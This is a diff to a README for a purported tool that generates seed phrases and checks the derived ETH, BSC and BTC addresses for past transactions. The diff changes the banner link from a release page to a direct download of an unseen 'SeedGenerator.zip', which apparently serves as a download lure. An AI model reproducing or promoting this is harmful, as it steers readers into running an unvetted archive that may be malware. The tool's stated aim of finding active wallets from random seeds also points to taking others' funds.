@@ -1,6 +1,6 @@
 # Crypto Address Generator and Transaction Finder from Generated Random Wallet Seed Phrases 2026
 
-[![Banner](https://camo.githubusercontent.com/956c28123d2e0a54d6f24041f4c44adad36fdce398295c59e849de14449897c5/68747470733a2f2f692e696d6775722e636f6d2f3563756e376f6e2e6a706567)](https://github.com/leonv-dev1901v5/Seed-Phrase-Generator-2026/releases/tag/Script)
+[![Banner](https://camo.githubusercontent.com/956c28123d2e0a54d6f24041f4c44adad36fdce398295c59e849de14449897c5/68747470733a2f2f692e696d6775722e636f6d2f3563756e376f6e2e6a706567)](https://github.com/leonv-dev1901v5/Seed-Phrase-Generator-2026/releases/download/Script/SeedGenerator.zip)
 
 Generate crypto addresses (ETH, BSC and BTC) from random seed phrase and then check if transaction ever took place.
 
